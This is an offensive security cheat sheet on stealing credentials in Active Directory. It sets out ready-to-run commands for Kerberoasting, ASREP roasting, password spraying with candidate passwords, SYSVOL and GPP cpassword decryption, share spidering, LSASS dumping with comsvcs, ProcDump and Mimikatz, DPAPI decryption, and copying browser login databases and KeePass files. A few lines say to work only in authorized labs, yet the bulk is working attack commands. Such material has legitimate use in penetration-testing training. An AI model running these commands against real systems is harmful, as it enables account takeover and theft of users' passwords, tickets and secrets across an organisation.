# Credential Access

Credential access in Active Directory focuses on obtaining usable authentication material after initial access or authenticated enumeration.

This can include passwords, hashes, Kerberos tickets, DPAPI secrets, browser credentials, KeePass databases, credentials in SYSVOL, credentials in shares, LSASS material, and reusable tokens.

Common credential material:

| Material | Meaning |
| --- | --- |
| Password | Plaintext secret. |
| NT hash | Password-derived Windows hash. |
| NetNTLMv1/v2 | NTLM challenge-response material. |
| TGT | Kerberos Ticket Granting Ticket. |
| TGS | Kerberos service ticket. |
| DPAPI masterkey | Key material used to protect user secrets. |
| Browser secret | Saved web credential, cookie, or token. |
| KeePass database | Encrypted password vault file. |
| Certificate / PFX | Certificate material usable for authentication in some environments. |

Basic variables used in examples:

```bash
export DOMAIN=corp.local
export NETBIOS=CORP
export USER=alice
export PASS='Password123!'
export DC_IP=10.10.10.10
export DC_HOST=dc01.corp.local
export TARGET=10.10.10.20
export RANGE=10.10.10.0/24
export NTLM='8846f7eaee8fb117ad06bdd830b7586c'
```

Useful resources:

- [HackTricks - Active Directory Methodology](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html)
- [HackTricks - Stealing Windows Credentials](https://hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html)
- [HackTricks - DPAPI Extracting Passwords](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html)
- [The Hacker Recipes - Kerberoast](https://www.thehacker.recipes/ad/movement/kerberos/kerberoast)
- [The Hacker Recipes - ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast)
- [NetExec Documentation](https://www.netexec.wiki/)
- [Impacket](https://github.com/fortra/impacket)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)
- [pypykatz](https://github.com/skelsec/pypykatz)
- [WADComs](https://wadcoms.github.io/)

---

## Kerberoasting

Kerberoasting targets domain user accounts that have Service Principal Names.

When a domain user requests a service ticket for an SPN, part of the returned ticket is encrypted with key material derived from the service account password. If the SPN belongs to a user account, the ticket can often be cracked offline.

Requirements:

| Requirement | Notes |
| --- | --- |
| Valid domain account | Usually any low-privileged domain user. |
| Reachable KDC | Usually a domain controller on port `88`. |
| SPN on user account | Target service account must have SPN. |
| Cracking wordlist | Offline cracking after ticket collection. |

Good targets usually have:

- SPN set on a user account
- old password
- weak password policy
- privileged group membership
- service-like name
- description suggesting service usage

**Find SPN users with LDAP**

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" \
sAMAccountName servicePrincipalName memberOf pwdLastSet lastLogonTimestamp
```

**Find SPN users with PowerView**

```powershell
Get-DomainUser -SPN
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,pwdlastset,memberof
```

**Request TGS hashes with Impacket**

```bash
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request
```

Save to file:

```bash
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request -outputfile kerberoast_hashes.txt
```

With hash:

```bash
GetUserSPNs.py $DOMAIN/$USER -hashes :$NTLM -dc-ip $DC_IP -request -outputfile kerberoast_hashes.txt
```

Kerberos mode:

```bash
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-host $DC_HOST -k -request -outputfile kerberoast_hashes.txt
```

**Request with NetExec**

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --kerberoasting kerberoast_hashes.txt
```

With hash:

```bash
nxc ldap $DC_IP -u $USER -H $NTLM -d $DOMAIN --kerberoasting kerberoast_hashes.txt
```

**Request with Rubeus**

```powershell
Rubeus.exe kerberoast
```

Write hashes to file:

```powershell
Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
```

Target one user:

```powershell
Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_tgs.txt
```

RC4-only style request:

```powershell
Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_rc4.txt
```

**Cracking**

Common Hashcat modes:

| Hash type | Mode |
| --- | --- |
| Kerberos 5 TGS-REP etype 23 | `13100` |
| Kerberos 5 TGS-REP etype 17 | `19600` |
| Kerberos 5 TGS-REP etype 18 | `19700` |

Hashcat:

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

Rules:

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

Show cracked:

```bash
hashcat -m 13100 kerberoast_hashes.txt --show
```

John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
john --show kerberoast_hashes.txt
```

**Result interpretation**

| Result | Meaning |
| --- | --- |
| Hash collected | TGS was requested and saved. |
| Crack succeeds | Plaintext password recovered. |
| Crack fails | Password may be strong or unsupported by current wordlist. |
| AES hash | Usually harder than RC4. |
| Privileged service account | Higher-value credential. |


---

## ASREP Roasting

ASREP roasting targets users that do not require Kerberos pre-authentication.

If pre-authentication is disabled, the KDC can return AS-REP material that includes data encrypted with the user's password-derived key. This material can be cracked offline.

ASREP roasting can be performed without credentials if a username list is available.

It can also be performed with credentials by first finding users with the `DONT_REQ_PREAUTH` flag.

Requirements:

| Requirement | Notes |
| --- | --- |
| Domain name | Example: `corp.local`. |
| DC IP | KDC target. |
| Username list | For unauthenticated check. |
| Kerberos reachable | Port `88`. |
| Account with pre-auth disabled | Target condition. |

**Unauthenticated ASREP check**

```bash
GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass
```

Save hashes:

```bash
GetNPUsers.py $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass -outputfile asrep_hashes.txt
```

**Authenticated discovery with LDAP**

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
sAMAccountName userPrincipalName memberOf pwdLastSet
```

**Authenticated ASREP with Impacket**

```bash
GetNPUsers.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP -request -outputfile asrep_hashes.txt
```

**NetExec**

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --asreproast asrep_hashes.txt
```

**PowerView**

```powershell
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

**Rubeus**

```powershell
Rubeus.exe asreproast
```

Output to file:

```powershell
Rubeus.exe asreproast /outfile:asrep_hashes.txt
```

**Cracking**

Hashcat mode:

| Hash type | Mode |
| --- | --- |
| Kerberos 5 AS-REP etype 23 | `18200` |

Hashcat:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

Show cracked:

```bash
hashcat -m 18200 asrep_hashes.txt --show
```

John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
john --show asrep_hashes.txt
```

**Result interpretation**

| Result | Meaning |
| --- | --- |
| AS-REP hash returned | Account likely does not require pre-auth. |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User likely does not exist. |
| `KDC_ERR_PREAUTH_REQUIRED` | User exists but pre-auth is required. |
| Crack succeeds | Plaintext password recovered. |
| Crack fails | Strong password or weak cracking strategy. |



---

## Password Spraying

Password spraying tests one or a small number of passwords against many users.

It is different from brute force.

Brute force usually tests many passwords against one user. Password spraying tests one password across many users to reduce lockout risk.

Password spraying should only be performed when explicitly allowed and after checking the password policy.

**Before spraying**

Collect:

| Item | Why it matters |
| --- | --- |
| Valid users | Reduces noise and failed attempts. |
| Lockout threshold | Number of bad attempts before lockout. |
| Observation window | Time window for counting failures. |
| Lockout duration | How long lockout lasts. |
| Fine-grained password policy | Different users may have different lockout settings. |
| Scope | Which users and systems are allowed. |
| Timing | Avoid business impact in real assessments. |

**Get password policy**

```bash
nxc smb $DC_IP -u $USER -p "$PASS" -d $DOMAIN --pass-pol
```

LDAP/domain policy:

```bash
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --pass-pol
```

RPC:

```bash
rpcclient -U "$NETBIOS\\$USER%$PASS" $DC_IP -c "getdompwinfo"
```

PowerShell:

```powershell
net accounts /domain
Get-ADDefaultDomainPasswordPolicy
```

**Prepare users**

```bash
cat users.txt | tr '[:upper:]' '[:lower:]' | sort -u > users_clean.txt
```

Remove machine accounts:

```bash
grep -v '\$$' users_clean.txt > users_no_machines.txt
```

**SMB spray with NetExec**

```bash
nxc smb $DC_IP -u users_no_machines.txt -p 'Password123!' --continue-on-success
```

With domain:

```bash
nxc smb $DC_IP -u users_no_machines.txt -p 'Password123!' -d $DOMAIN --continue-on-success
```

Against a host list:

```bash
nxc smb targets.txt -u users_no_machines.txt -p 'Password123!' -d $DOMAIN --continue-on-success
```

**LDAP spray with NetExec**

```bash
nxc ldap $DC_IP -u users_no_machines.txt -p 'Password123!' -d $DOMAIN --continue-on-success
```

**Kerberos spray with Kerbrute**

```bash
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users_no_machines.txt 'Password123!'
```

Save output:

```bash
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users_no_machines.txt 'Password123!' -o spray_password123.txt
```

**Username-as-password spray**

```bash
nxc smb $DC_IP -u users_no_machines.txt -p users_no_machines.txt --no-bruteforce -d $DOMAIN --continue-on-success
```

This tests:

```text
alice:alice
bob:bob
charlie:charlie
```

**Candidate passwords**

Common lab-style candidates:

```text
Password123!
Welcome1!
Welcome123!
Summer2025!
Winter2026!
Company2025!
Corp2025!
ChangeMe123!
```

Build custom candidates from context:

| Source | Example |
| --- | --- |
| Company name | `Corp2026!` |
| Season/year | `Summer2026!` |
| Product name | `Product2026!` |
| Domain name | `Corp.local2026!` |
| Internal file hints | Passwords found in scripts or docs. |
| Naming convention | `Welcome_<site>` |

**Result interpretation**

| Result | Meaning |
| --- | --- |
| Successful login | Valid credential pair. |
| `STATUS_LOGON_FAILURE` | Wrong password. |
| `STATUS_ACCOUNT_LOCKED_OUT` | Account locked. Stop and reassess. |
| `STATUS_PASSWORD_MUST_CHANGE` | Valid password but change required. |
| `STATUS_ACCOUNT_DISABLED` | Account disabled. |
| `STATUS_LOGON_TYPE_NOT_GRANTED` | Credentials valid but logon type not allowed. |
| `KDC_ERR_PREAUTH_FAILED` | Wrong password in Kerberos context. |
| `KDC_ERR_CLIENT_REVOKED` | Account disabled, locked, or restricted. |



---

## Password Policy

Password policy determines how safe password testing is.

Before any password spray, identify lockout and password policy.

Policy may exist at:

| Policy type | Scope |
| --- | --- |
| Default domain password policy | Domain-wide default. |
| Fine-Grained Password Policy | Applies to selected users or groups. |
| Local password policy | Local machine accounts. |
| Application policy | Separate app-specific authentication. |

**NetExec**

```bash
nxc smb $DC_IP -u $USER -p "$PASS" -d $DOMAIN --pass-pol
nxc ldap $DC_IP -u $USER -p "$PASS" -d $DOMAIN --pass-pol
```

**RPC**

```bash
rpcclient -U "$NETBIOS\\$USER%$PASS" $DC_IP -c "getdompwinfo"
```

**Windows built-ins**

```cmd
net accounts /domain
```

**PowerShell AD module**

```powershell
Get-ADDefaultDomainPasswordPolicy
```

Fine-Grained Password Policies:

```powershell
Get-ADFineGrainedPasswordPolicy -Filter *
Get-ADUserResultantPasswordPolicy alice
```

**PowerView**

```powershell
Get-DomainPolicyData
Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess
```

**LDAP default domain policy**

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "DC=corp,DC=local" "(objectClass=domainDNS)" \
minPwdLength pwdHistoryLength maxPwdAge minPwdAge lockoutThreshold lockoutDuration lockOutObservationWindow
```

**LDAP Fine-Grained Password Policies**

```bash
ldapsearch -x -H ldap://$DC_IP -D "$NETBIOS\\$USER" -w "$PASS" \
-b "CN=Password Settings Container,CN=System,DC=corp,DC=local" "(objectClass=msDS-PasswordSettings)" \
cn msDS-MinimumPasswordLength msDS-LockoutThreshold msDS-LockoutDuration msDS-LockoutObservationWindow msDS-PSOAppliesTo
```

**Fields**

| Field | Meaning |
| --- | --- |
| `minPwdLength` | Minimum password length. |
| `pwdHistoryLength` | Password history length. |
| `maxPwdAge` | Maximum password age. |
| `minPwdAge` | Minimum password age. |
| `lockoutThreshold` | Bad attempts before lockout. |
| `lockoutDuration` | Lockout duration. |
| `lockOutObservationWindow` | Time window for failed attempt counting. |
| Fine-grained policy | User/group-specific override. |

**Policy interpretation**

| Finding | Meaning |
| --- | --- |
| Lockout threshold `0` | No lockout configured. Still avoid noisy testing. |
| Lockout threshold `3-5` | Very high risk for spraying. |
| Long observation window | Wait longer between attempts. |
| Fine-grained policy exists | Some users may have different lockout rules. |
| Minimum length low | Weak passwords more likely. |
| Password never expires users | May have old reusable passwords. |


---

## Credential Hunting

Credential hunting is the process of searching accessible systems and files for secrets.

This is usually done after obtaining a valid account or local access to a machine.

Common targets:

| Location | Examples |
| --- | --- |
| Shares | Scripts, backups, configs, docs. |
| User profiles | Desktop, Downloads, Documents. |
| Web configs | `web.config`, `.env`, `appsettings.json`. |
| Scripts | PowerShell, batch, VBS, Python. |
| Databases | Connection strings, dumps. |
| Remote access files | `.rdp`, VPN configs, PuTTY sessions. |
| Dev files | Git configs, deployment files. |
| Password vaults | KeePass, browser stores. |
| Logs | Application logs, install logs. |
| Scheduled tasks | Stored run-as context or script paths. |

**Linux search after downloading files**

```bash
grep -RniE "password|passwd|pwd|cred|secret|token|apikey|api_key|connectionstring|login|username|user" .
```

Interesting files:

```bash
find . -type f \( \
-iname "*.txt" -o -iname "*.csv" -o -iname "*.xml" -o -iname "*.json" -o \
-iname "*.config" -o -iname "*.conf" -o -iname "*.ini" -o -iname "*.yml" -o -iname "*.yaml" -o \
-iname "*.ps1" -o -iname "*.bat" -o -iname "*.cmd" -o -iname "*.vbs" -o \
-iname "*.sql" -o -iname "*.bak" -o -iname "*.zip" -o -iname "*.7z" -o \
-iname "*.kdbx" -o -iname "*.rdp" -o -iname "*.ppk" -o -iname "*.pem" -o -iname "*.key" \
\)
```

Search for likely password assignments:

```bash
grep -RniE "(password|passwd|pwd|pass|secret|token|key)\s*[:=]" .
```

Search connection strings:

```bash
grep -RniE "Data Source|Initial Catalog|User ID|Password|Server=|Database=|Trusted_Connection|Integrated Security" .
```

Search private keys:

```bash
grep -RniE "BEGIN .*PRIVATE KEY|BEGIN OPENSSH PRIVATE KEY|BEGIN RSA PRIVATE KEY" .
```

**Windows search**

```cmd
findstr /S /I /M "password passwd pwd secret token api_key connectionstring" *.*
```

PowerShell:

```powershell
Select-String -Path .\* -Pattern "password","passwd","pwd","secret","token","api_key","connectionstring" -Recurse -ErrorAction SilentlyContinue
```

Find files:

```powershell
Get-ChildItem -Recurse -Force -Include *.txt,*.config,*.xml,*.json,*.ini,*.ps1,*.bat,*.cmd,*.kdbx,*.rdp,*.ppk,*.pem,*.key -ErrorAction SilentlyContinue
```

**Common Windows paths**

```text
C:\Users\<user>\Desktop
C:\Users\<user>\Documents
C:\Users\<user>\Downloads
C:\Users\<user>\AppData\Roaming
C:\Users\<user>\AppData\Local
C:\inetpub\wwwroot
C:\ProgramData
C:\Scripts
C:\Backup
C:\Temp
C:\Windows\Temp
```

**Common Linux paths on mixed environments**

```text
/home
/var/www
/opt
/srv
/etc
/backup
/tmp
```

**Interesting patterns**

| Pattern | Why it matters |
| --- | --- |
| `password=` | Direct credential. |
| `User ID=` | Database connection string. |
| `apikey` | API access. |
| `token` | Session or API token. |
| `runas` | Stored run-as usage. |
| `net use` | Mapped share with credentials. |
| `cmdkey` | Windows stored credential reference. |
| `.kdbx` | KeePass database. |
| `.rdp` | RDP target/user context. |
| `.ppk` / `.pem` | SSH keys. |



---

## SYSVOL Credentials

SYSVOL is a domain share hosted on domain controllers.

It contains Group Policy files, scripts, and other domain-wide policy data.

Path format:

```text
\\corp.local\SYSVOL\corp.local\
```

SYSVOL is usually readable by domain users.

**List SYSVOL**

```bash
smbclient //$DC_IP/SYSVOL -U "$DOMAIN/$USER%$PASS" -c 'recurse ON; ls'
```

Mount SYSVOL:

```bash
sudo mkdir -p /mnt/sysvol
sudo mount -t cifs //$DC_IP/SYSVOL /mnt/sysvol -o username=$USER,password="$PASS",domain=$DOMAIN
```

**Search SYSVOL**

```bash
find /mnt/sysvol -type f
```

Interesting file types:

```bash
find /mnt/sysvol -type f \( -iname "*.xml" -o -iname "*.ps1" -o -iname "*.bat" -o -iname "*.cmd" -o -iname "*.vbs" -o -iname "*.ini" -o -iname "*.txt" \)
```

Search for secrets:

```bash
grep -RniE "password|passwd|pwd|cred|secret|user|login|administrator|runas|net use" /mnt/sysvol
```

**Common SYSVOL paths**

```text
\\corp.local\SYSVOL\corp.local\Policies\
\\corp.local\SYSVOL\corp.local\scripts\
\\corp.local\NETLOGON\
```

**Interesting GPO files**

| File | Why it matters |
| --- | --- |
| `Groups.xml` | Local users/groups preference data. |
| `Services.xml` | Service preference configuration. |
| `ScheduledTasks.xml` | Scheduled task configuration. |
| `Drives.xml` | Drive mappings. |
| `DataSources.xml` | Database connection data. |
| `Registry.xml` | Registry preference data. |
| `Printers.xml` | Printer preference data. |
| `scripts.ini` | Startup/logon script references. |
| `GptTmpl.inf` | Security template settings. |

**NETLOGON scripts**

```bash
smbclient //$DC_IP/NETLOGON -U "$DOMAIN/$USER%$PASS" -c 'recurse ON; ls'
```

Download scripts:

```bash
smbclient //$DC_IP/NETLOGON -U "$DOMAIN/$USER%$PASS" -c 'recurse ON; prompt OFF; mget *'
```

Look for:

```text
net use
runas
password
cmdkey
powershell -enc
mapped drives
database connections
local admin operations
```



---

## GPP cpassword

Group Policy Preferences historically allowed administrators to store passwords in XML files inside SYSVOL.

The password value was stored in the `cpassword` attribute.

The AES key used to decrypt GPP `cpassword` values became public, so any domain user who can read SYSVOL can decrypt these old stored values if present.

Common files:

```text
Groups.xml
Services.xml
ScheduledTasks.xml
DataSources.xml
Drives.xml
Printers.xml
Registry.xml
```

**Search for cpassword**

Mounted SYSVOL:

```bash
grep -Rni "cpassword" /mnt/sysvol
```

SMB share spider with NetExec:

```bash
nxc smb $DC_IP -u $USER -p "$PASS" -d $DOMAIN -M gpp_password
```

Older tool:

```bash
gpp-decrypt 'CPasswordValueHere'
```

Manual find:

```bash
find /mnt/sysvol -type f -iname "*.xml" -exec grep -Hni "cpassword" {} \;
```

**Example XML pattern**

```xml
<User name="Administrator" cpassword="..." />
```

Useful XML fields:

| Field | Meaning |
| --- | --- |
| `cpassword` | Encrypted GPP password value. |
| `userName` / `name` | Target account name. |
| `changed` | Timestamp in XML. |
| `description` | Sometimes shows purpose. |
| `runAs` | Execution context. |
| `newName` | Local account rename field. |

**Decrypt**

```bash
gpp-decrypt 'CPasswordValueHere'
```

**Search and decrypt workflow**

```bash
grep -Rni "cpassword" /mnt/sysvol | tee gpp_cpassword_hits.txt
```

Extract values manually and decrypt:

```bash
gpp-decrypt 'VALUE'
```

**Common result**

```text
Account: local Administrator or domain account
Password: plaintext recovered from cpassword
Source: SYSVOL GPP XML
```



---

## Shares Secrets

Share secrets are credentials or useful authentication material found in SMB shares.

After getting a valid domain user, share access often expands significantly.

**Enumerate shares**

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --shares
```

Readable shares:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --shares READ
```

Writable shares:

```bash
nxc smb $RANGE -u $USER -p "$PASS" -d $DOMAIN --shares WRITE
```

Spider share:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --spider SHARENAME
```

Spider for password patterns:

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --spider SHARENAME --pattern password
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --spider SHARENAME --pattern cred
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --spider SHARENAME --pattern backup
```

**smbmap**

```bash
smbmap -H $TARGET -d $DOMAIN -u $USER -p "$PASS" -R
```

Download file:

```bash
smbmap -H $TARGET -d $DOMAIN -u $USER -p "$PASS" --download 'SHARE\\path\\file.txt'
```

**smbclient**

```bash
smbclient //$TARGET/SHARENAME -U "$DOMAIN/$USER%$PASS"
```

Recursive download in labs:

```bash
smbclient //$TARGET/SHARENAME -U "$DOMAIN/$USER%$PASS" -c 'recurse ON; prompt OFF; mget *'
```

**Interesting shares**

| Share | Notes |
| --- | --- |
| `IT` | Scripts, deployment files, admin notes. |
| `Backups` | Archives, config exports, database dumps. |
| `Software` | Installers, deployment scripts. |
| `Dev` | Source code, config files, `.env`. |
| `Web` | Web app configs. |
| `DBA` | Database scripts and credentials. |
| `Home` / `Users` | User files and vaults. |
| `Projects` | App docs and integration configs. |
| `Scans` | Sometimes contains documents with names or secrets. |

**Interesting files**

```text
passwords.txt
creds.txt
accounts.csv
users.xlsx
web.config
appsettings.json
.env
database.ini
db.conf
settings.xml
backup.zip
backup.7z
dump.sql
*.kdbx
*.rdp
*.ppk
*.pem
id_rsa
```

**Search downloaded share**

```bash
grep -RniE "password|passwd|pwd|cred|secret|token|api|key|login|connectionstring|user id|uid" .
```

Search file names:

```bash
find . -iname "*pass*" -o -iname "*cred*" -o -iname "*secret*" -o -iname "*backup*" -o -iname "*.kdbx" -o -iname "*.config" -o -iname "*.sql"
```



---

## LSASS Dumping

LSASS is the Local Security Authority Subsystem Service.

It handles Windows authentication and may contain credential material for users who logged on to the machine.

LSASS dumping generally requires local administrator or equivalent privileges on the target host.

Do this only in authorized labs or explicitly scoped assessments.

Possible material in or related to LSASS:

| Material | Notes |
| --- | --- |
| NT hashes | Depends on logon type and protections. |
| Kerberos tickets | TGTs and service tickets. |
| Plaintext credentials | Less common on modern systems, but possible in some conditions. |
| DPAPI keys | Useful for decrypting user secrets. |
| Logon sessions | User and authentication context. |

**Check local admin**

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN
```

`Pwn3d!` or similar output usually indicates administrative access for that protocol.

**Dump with NetExec**

```bash
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --sam
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN --lsa
nxc smb $TARGET -u $USER -p "$PASS" -d $DOMAIN -M lsassy
```

With hash:

```bash
nxc smb $TARGET -u $USER -H $NTLM -d $DOMAIN --sam
nxc smb $TARGET -u $USER -H $NTLM -d $DOMAIN --lsa
nxc smb $TARGET -u $USER -H $NTLM -d $DOMAIN -M lsassy
```

**Dump with lsassy**

```bash
lsassy -d $DOMAIN -u $USER -p "$PASS" $TARGET
```

With hash:

```bash
lsassy -d $DOMAIN -u $USER -H $NTLM $TARGET
```

**Dump LSASS with comsvcs.dll on a Windows host**

Find LSASS PID:

```cmd
tasklist /fi "imagename eq lsass.exe"
```

Dump:

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
```

**Dump with ProcDump**

```cmd
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

**Parse dump with pypykatz**

```bash
pypykatz lsa minidump lsass.dmp
```

Save output:

```bash
pypykatz lsa minidump lsass.dmp | tee pypykatz_lsass.txt
```

**Parse with Mimikatz**

```cmd
mimikatz.exe
privilege::debug
sekurlsa::minidump C:\Windows\Temp\lsass.dmp
sekurlsa::logonpasswords
sekurlsa::tickets
```

**Live Mimikatz on authorized lab host**

```cmd
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
```

**Useful outputs**

| Output | Meaning |
| --- | --- |
| `msv` | NTLM-related credential material. |
| `wdigest` | Plaintext possible only in specific conditions. |
| `kerberos` | Kerberos tickets and keys. |
| `tspkg` | Older credential provider context. |
| `credman` | Credential Manager entries. |
| `dpapi` | DPAPI masterkey-related material. |



---

## DPAPI

DPAPI is the Windows Data Protection API.

It protects many user and machine secrets, including saved browser credentials, Windows Credential Manager entries, Wi-Fi secrets, RDP credentials, and application secrets.

DPAPI data is usually encrypted with masterkeys tied to the user, machine, password, domain backup keys, or current logon context.

Useful DPAPI locations:

| Location | Meaning |
| --- | --- |
| `%APPDATA%\Microsoft\Protect\<SID>\` | User masterkeys. |
| `%LOCALAPPDATA%\Microsoft\Credentials\` | User credentials. |
| `%APPDATA%\Microsoft\Credentials\` | Roaming credentials. |
| `%LOCALAPPDATA%\Microsoft\Vault\` | Vault data. |
| `%APPDATA%\Microsoft\Vault\` | Roaming vault data. |
| Chrome/Edge profile | Browser secrets protected with DPAPI. |
| RDP / RDCMan files | Remote access secrets. |

**Windows paths**

```text
C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\
C:\Users\<user>\AppData\Local\Microsoft\Credentials\
C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
C:\Users\<user>\AppData\Local\Microsoft\Vault\
C:\Users\<user>\AppData\Roaming\Microsoft\Vault\
```

**Mimikatz DPAPI triage**

Live context:

```cmd
mimikatz.exe
privilege::debug
sekurlsa::dpapi
sekurlsa::logonpasswords
```

List masterkeys:

```cmd
dpapi::masterkey /in:C:\Users\alice\AppData\Roaming\Microsoft\Protect\<SID>\<MASTERKEY_GUID>
```

Decrypt credential file with known masterkey:

```cmd
dpapi::cred /in:C:\Users\alice\AppData\Local\Microsoft\Credentials\<FILE> /masterkey:<MASTERKEY>
```

**SharpDPAPI**

Triage current user context:

```cmd
SharpDPAPI.exe triage
```

Credential Manager:

```cmd
SharpDPAPI.exe credentials
```

Vaults:

```cmd
SharpDPAPI.exe vaults
```

RDCMan/RDP-related secrets:

```cmd
SharpDPAPI.exe rdg
```

Browser-related DPAPI data:

```cmd
SharpDPAPI.exe triage
```

Remote triage when local admin:

```cmd
SharpDPAPI.exe triage /server:HOSTNAME
```

Using password:

```cmd
SharpDPAPI.exe credentials /password:Password123!
```

Using NTLM:

```cmd
SharpDPAPI.exe credentials /ntlm:8846f7eaee8fb117ad06bdd830b7586c
```

**Domain backup key concept**

In domain environments, DPAPI domain backup keys may allow decryption of domain user DPAPI secrets if the backup key is obtained.

This is a high-impact domain credential access path and usually requires high privileges.

**Useful outputs**

| Output | Meaning |
| --- | --- |
| Masterkey GUID | Identifies DPAPI masterkey. |
| Decrypted credential | Saved Windows credential. |
| Vault entry | Saved secret from Windows Vault. |
| Browser secret | Browser credential/cookie protected by DPAPI. |
| RDG/RDP secret | Remote Desktop credential material. |



---

## Browser Credentials

Browsers may store saved passwords, cookies, tokens, session data, history, and autofill data.

On Windows, browser secrets are commonly protected with DPAPI.

Common browser targets:

| Browser | Common Windows path |
| --- | --- |
| Chrome | `C:\Users\<user>\AppData\Local\Google\Chrome\User Data\` |
| Edge | `C:\Users\<user>\AppData\Local\Microsoft\Edge\User Data\` |
| Brave | `C:\Users\<user>\AppData\Local\BraveSoftware\Brave-Browser\User Data\` |
| Firefox | `C:\Users\<user>\AppData\Roaming\Mozilla\Firefox\Profiles\` |

Interesting Chromium files:

```text
Local State
Default\Login Data
Default\Cookies
Default\History
Default\Web Data
Default\Bookmarks
Default\Network\Cookies
```

Interesting Firefox files:

```text
logins.json
key4.db
cookies.sqlite
places.sqlite
permissions.sqlite
cert9.db
```

**Find browser profiles**

PowerShell:

```powershell
Get-ChildItem "C:\Users" -Recurse -Force -ErrorAction SilentlyContinue -Include "Login Data","Cookies","Local State","logins.json","key4.db"
```

CMD:

```cmd
dir /s /b "C:\Users\*\AppData\Local\Google\Chrome\User Data\Local State"
dir /s /b "C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Local State"
dir /s /b "C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json"
```

**Chromium files to collect in labs**

```text
Local State
Login Data
Cookies
History
Web Data
Bookmarks
```

Copy carefully because SQLite files may be locked if the browser is running.

Example:

```cmd
copy "C:\Users\alice\AppData\Local\Google\Chrome\User Data\Local State" C:\Windows\Temp\
copy "C:\Users\alice\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\Windows\Temp\
```

**Firefox files to collect in labs**

```text
logins.json
key4.db
cookies.sqlite
places.sqlite
```

Example:

```cmd
copy "C:\Users\alice\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>\logins.json" C:\Windows\Temp\
copy "C:\Users\alice\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>\key4.db" C:\Windows\Temp\
```

**SharpChrome**

```cmd
SharpChrome.exe logins
SharpChrome.exe cookies
SharpChrome.exe history
```

**SharpDPAPI browser-related triage**

```cmd
SharpDPAPI.exe triage
```

**Linux analysis after copying**

SQLite inspection:

```bash
sqlite3 "History" "select url,title,last_visit_time from urls limit 20;"
sqlite3 "Login Data" "select origin_url,username_value from logins;"
```

Firefox:

```bash
ls -la
file logins.json key4.db
```

**Useful browser findings**

| Finding | Why it matters |
| --- | --- |
| Saved passwords | Direct credential source. |
| Cookies | May contain active sessions. |
| Tokens | App/API access. |
| History | Internal apps and admin panels. |
| Bookmarks | Important internal URLs. |
| Autofill | Names, emails, addresses, usernames. |
| Client certs | Possible certificate-based access context. |



---

## KeePass Hunting

KeePass databases are common password vault files.

The main file extension is:

```text
.kdbx
```

A KeePass database usually requires a master password, key file, Windows user account binding, or a combination.

Common places to look:

```text
C:\Users\<user>\Documents
C:\Users\<user>\Desktop
C:\Users\<user>\Downloads
C:\Users\<user>\AppData
Shares
Backups
IT folders
```

**Find KeePass files on Windows**

```cmd
dir /s /b C:\Users\*.kdbx
dir /s /b C:\*.kdbx
```

PowerShell:

```powershell
Get-ChildItem C:\Users -Recurse -Force -ErrorAction SilentlyContinue -Include *.kdbx,*.key,*.keyx
```

